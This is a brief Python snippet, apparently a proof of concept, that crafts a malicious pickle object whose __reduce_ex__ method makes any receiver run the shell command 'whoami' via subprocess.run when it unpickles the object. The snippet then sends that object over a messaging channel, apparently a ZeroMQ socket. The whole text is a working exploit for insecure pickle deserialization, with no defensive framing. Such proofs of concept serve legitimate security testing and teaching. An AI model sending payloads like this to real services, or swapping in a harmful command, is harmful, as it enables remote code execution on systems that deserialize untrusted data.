import pickle
import subprocess
class Record:
    def __reduce_ex__(self, protocol):
        return (subprocess.run, (["whoami"],))
wire = pickle.dumps(Record())
channel.send_multipart([wire])
